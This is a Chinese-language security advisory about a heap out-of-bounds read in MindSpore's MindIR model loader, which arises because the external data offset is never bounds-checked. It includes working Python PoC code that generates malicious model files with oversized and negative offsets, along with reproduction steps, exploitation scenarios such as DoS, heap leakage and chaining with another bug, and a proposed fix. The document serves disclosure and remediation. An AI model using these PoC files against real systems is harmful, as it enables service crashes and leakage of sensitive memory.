# MS-2025-002: MindIR External Data Offset/Length 堆越界读取

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [mindspore-ai/mindspore](https://github.com/mindspore-ai/mindspore) / [Gitee](https://gitee.com/mindspore/mindspore) |
| **版本** | 2.8.0 (Gitee master branch 截至 2026-05-19) |
| **严重性** | High |
| **CVSS 3.1** | 7.1 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H) |
| **CWE** | CWE-125 (Out-of-bounds Read) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 本地 / 需要用户加载恶意模型文件 |
| **影响组件** | `mindspore/core/load_mindir/load_model.cc` — `GetTensorDataFromExternal()` |

---

## 漏洞概述

MindSpore 在加载 MindIR 模型时，从外部文件读取张量数据后，使用 protobuf 中的 `external_data.offset` 字段作为源缓冲区偏移量，通过 `huge_memcpy` 执行内存拷贝。该 `offset` 值**完全由模型文件控制，且在文件读取路径中没有任何边界校验**。

当 `offset >= file_size` 时，`data + offset` 指向已分配堆缓冲区之外的内存，导致堆越界读取（Heap Buffer Over-Read）。

**讽刺的是**：同一函数内 `weight_buffer_` 分支**有**边界检查，但文件读取分支却遗漏了，属于典型的不一致安全逻辑缺陷。

---

## 影响

- **DoS（崩溃）**：offset 指向未映射页面时触发 segfault，进程终止
- **信息泄露**：读取堆上相邻数据（可能包含其他模型参数、密钥、用户数据）
- **ASLR 绕过辅助**：在某些条件下可泄露堆布局信息

---

## 漏洞代码分析

### 根因：offset 直接参与指针运算，无边界校验

**文件**: `mindspore/core/load_mindir/load_model.cc`

```cpp
bool MSANFModelParser::GetTensorDataFromExternal(const mind_ir::TensorProto &tensor_proto,
                                                 const tensor::TensorPtr &tensor_info) {
  // ... 从文件读取数据到 data 指针（大小 = file_size）...
  
  // [漏洞点] offset 直接参与指针运算，无上限校验
  auto ret =
    common::huge_memcpy(tensor_data_buf, tensor_info->DataNBytes(),
                        data + tensor_proto.external_data().offset(),  // ← OOB!
                        LongToSize(tensor_proto.external_data().length()));
}
```

### 关键技术细节

#### 1. `offset` 不经过 `LongToSize` 转换

```cpp
data + tensor_proto.external_data().offset()   // offset: int64_t，直接参与指针运算
LongToSize(tensor_proto.external_data().length())  // length: 经过 LongToSize
```

`LongToSize` 的实现（`convert_utils_base.h`）：

```cpp
inline size_t LongToSize(int64_t u) {
  if (u < 0) {
    MS_LOG(INTERNAL_EXCEPTION) << "The int64_t value(" << u << ") is less than 0.";
  }
  return static_cast<size_t>(u);
}
```

**注意**：`offset` 未经过此函数！这意味着：
- **正值大 offset**（如 0x100000）：向高地址越界读取
- **负值 offset**（如 -4096）：C++ 指针算术允许负偏移，向低地址越界读取

两种方向的 OOB 都不会被任何检查拦截。

#### 2. `huge_memcpy` / `memcpy_s` 不校验源地址

`huge_memcpy` 实现（`ms_utils_secure.h`）：

```cpp
static inline errno_t huge_memcpy(uint8_t *destAddr, size_t destMaxLen, 
                                  const uint8_t *srcAddr, size_t srcLen) {
  // 分块调用 memcpy_s
  return memcpy_s(destAddr, destMaxLen, srcAddr, srcLen);
}
```

`memcpy_s` 校验内容（`third_party/securec/src/memcpy_s.c`）：

```cpp
// 只校验以下条件：
if (destMax == 0 || destMax > SECUREC_MEM_MAX_LEN) → ERANGE
if (dest == NULL || src == NULL) → EINVAL
if (count > destMax) → ERANGE  // ← 只检查目标缓冲区是否够大！
// 重叠检查...
```

**`memcpy_s` 不会、也无法校验 `srcAddr` 是否指向合法分配的内存区域**。它只保护目标缓冲区不溢出，不保护源地址不越界。因此，当 `data + offset` 指向堆外时，拷贝照常执行。

#### 3. 同一函数内的安全逻辑不一致

`weight_buffer_` 分支 **有** 边界检查：

```cpp
} else {
    data = reinterpret_cast<const unsigned char *>(weight_buffer_.first);
    // ✅ 有检查！
    if (LongToSize(tensor_proto.external_data().offset() + tensor_proto.external_data().length()) >
        weight_buffer_.second) {
      MS_LOG(ERROR) << "Weight buffer doesn't match model, ...";
      return false;
    }
}
```

文件读取分支 **没有** 同等检查：

```cpp
} else if (weight_buffer_.first == nullptr) {
    // Read file → data 指向大小为 file_size 的堆缓冲区
    // ❌ 无 offset + length 与 file_size 的比较！
}
// ... 两个分支汇合后直接使用 data + offset ...
```

---

## PoC 构造

```python
"""
MS-2025-002 PoC: MindIR External Data Offset 堆越界读取
设置 offset 远超外部数据文件大小，触发 heap-buffer-overflow
"""
import os
import sys

def create_oob_poc(output_dir="./oob_model"):
    from mindspore.train.mind_ir_pb2 import ModelProto, TensorProto

    os.makedirs(output_dir, exist_ok=True)

    # 创建一个小的合法外部数据文件（64 字节）
    data_file = os.path.join(output_dir, "data.bin")
    with open(data_file, "wb") as f:
        # 第一字节 = 0x01 以通过字节序检查（小端系统）
        f.write(b"\x01" + b"\x00" * 63)

    # 构造恶意模型
    model = ModelProto()
    model.ir_version = 6
    model.producer_name = "MindSpore"
    model.model_version = 1
    model.little_endian = True

    graph = model.graph
    graph.name = "oob_graph"

    param = graph.parameter.add()
    param.name = "Default/param0:param0"
    param.data_type = TensorProto.FLOAT
    param.dims.extend([256])  # 256 个 float = 1024 bytes

    # 设置 external_data: offset 远超文件大小
    param.external_data.location = "data.bin"
    param.external_data.offset = 0x100000   # 1MB offset，远超 64 字节文件
    param.external_data.length = 1024       # 读取 1024 字节的堆越界数据

    mindir_path = os.path.join(output_dir, "oob_model.mindir")
    with open(mindir_path, "wb") as f:
        f.write(model.SerializeToString())

    print(f"[+] OOB PoC 模型已创建: {mindir_path}")
    print(f"[+] 外部数据文件: {data_file} (64 bytes)")
    print(f"[+] 恶意 offset: 0x100000 (1048576)")
    print(f"[+] 越界读取: data + 1048576，远超 64 字节缓冲区")
    return mindir_path


def create_negative_offset_poc(output_dir="./oob_model_neg"):
    """负数 offset PoC — 向低地址方向越界"""
    from mindspore.train.mind_ir_pb2 import ModelProto, TensorProto

    os.makedirs(output_dir, exist_ok=True)

    data_file = os.path.join(output_dir, "data.bin")
    with open(data_file, "wb") as f:
        f.write(b"\x01" + b"\x00" * 63)

    model = ModelProto()
    model.ir_version = 6
    model.producer_name = "MindSpore"
    model.model_version = 1
    model.little_endian = True

    graph = model.graph
    graph.name = "oob_neg_graph"

    param = graph.parameter.add()
    param.name = "Default/param0:param0"
    param.data_type = TensorProto.FLOAT
    param.dims.extend([64])

    # 负数 offset: 向低地址越界
    param.external_data.location = "data.bin"
    param.external_data.offset = -4096  # 负偏移！
    param.external_data.length = 256

    mindir_path = os.path.join(output_dir, "oob_neg.mindir")
    with open(mindir_path, "wb") as f:
        f.write(model.SerializeToString())

    print(f"[+] 负 offset PoC 已创建: {mindir_path}")
    print(f"[+] offset = -4096，向低地址方向越界读取")
    return mindir_path


if __name__ == "__main__":
    print("=== 正向越界 PoC ===")
    create_oob_poc()
    print()
    print("=== 负向越界 PoC ===")
    create_negative_offset_poc()
```

---

## 复现步骤

### 方法 A：ASAN 检测（推荐，最权威）

```bash
# 从源码编译 MindSpore，启用 AddressSanitizer
git clone https://gitee.com/mindspore/mindspore.git
cd mindspore

# 修改 CMakeLists.txt 添加 ASAN flags
# 或设置环境变量：
export CXXFLAGS="-fsanitize=address -fno-omit-frame-pointer"
export CFLAGS="-fsanitize=address -fno-omit-frame-pointer"
export LDFLAGS="-fsanitize=address"

bash build.sh -e cpu
pip install output/mindspore-*.whl

# 运行 PoC
export ASAN_OPTIONS=detect_leaks=0
python3 poc_oob_read.py
python3 -c "import mindspore; mindspore.load('./oob_model/oob_model.mindir')"

# 预期 ASAN 输出：
# ==PID==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
# READ of size 1024 at 0x...
#     #0 ... in memcpy_s
#     #1 ... in mindspore::common::huge_memcpy(...)
#     #2 ... in mindspore::MSANFModelParser::GetTensorDataFromExternal(...)
```

### 方法 B：崩溃验证（简单快速）

```bash
# 安装 release 版本
pip install mindspore==2.8.0

# 生成 PoC
python3 poc_oob_read.py

# 加载恶意模型（预期 segfault）
python3 -c "
import mindspore
try:
    mindspore.load('./oob_model/oob_model.mindir')
except Exception as e:
    print(f'Exception: {e}')
"
# 如果 offset 足够大指向未映射页面：
# Segmentation fault (core dumped)  ← 证明 OOB 发生
```

### 方法 C：strace 验证

```bash
strace -e trace=read,mmap python3 -c "
import mindspore
mindspore.load('./oob_model/oob_model.mindir')
" 2>&1 | tail -20
# 观察 read 系统调用读取 data.bin (64 bytes)
# 随后 memcpy 操作访问超出范围的地址
```

---

## 利用场景

| 场景 | 效果 |
|------|------|
| DoS 攻击 | 大 offset 指向未映射页 → segfault → 服务崩溃 |
| 堆数据泄露 | 适当 offset → 读取堆上相邻的 tensor / 字符串 / 配置数据 |
| 与 001 组合 | 先用路径穿越读入已知文件（控制堆布局），再用 OOB 读相邻数据 |

---

## 修复建议

在 `huge_memcpy` 调用之前添加边界校验，与 `weight_buffer_` 分支保持一致：

```cpp
// 在两个分支汇合后、huge_memcpy 之前添加：
int64_t offset_val = tensor_proto.external_data().offset();
int64_t length_val = tensor_proto.external_data().length();

// 检查 offset 非负
if (offset_val < 0) {
  MS_LOG(ERROR) << "External data offset(" << offset_val << ") is negative.";
  return false;
}

size_t offset = LongToSize(offset_val);
size_t length = LongToSize(length_val);

// 检查 offset + length 不超出数据缓冲区大小
// 注意：需要记录 file_size 或从 tenor_data_ 获取缓冲区实际大小
if (offset > data_size || length > data_size - offset) {
  MS_LOG(ERROR) << "External data offset(" << offset << ") + length(" << length
                << ") exceeds data buffer size(" << data_size << ").";
  return false;
}

auto ret = common::huge_memcpy(tensor_data_buf, tensor_info->DataNBytes(),
                               data + offset, length);
```

**注意**：修复需要在文件读取分支中记录 `file_size`（或 `plain_len`）并传递到校验逻辑。建议将 `tenor_data_` 改为同时存储缓冲区大小。

---

## 参考

- [CWE-125: Out-of-bounds Read](https://cwe.mitre.org/data/definitions/125.html)
- [CVE-2023-25801: TensorFlow OOB read in TFLite](https://nvd.nist.gov/vuln/detail/CVE-2023-25801) — 类似的模型加载 OOB
- [memcpy_s 规范](https://en.cppreference.com/w/c/string/byte/memcpy) — 仅校验目标缓冲区，不校验源地址合法性
- [MindSpore Security Policy](https://gitee.com/mindspore/community/blob/master/security/README.md)
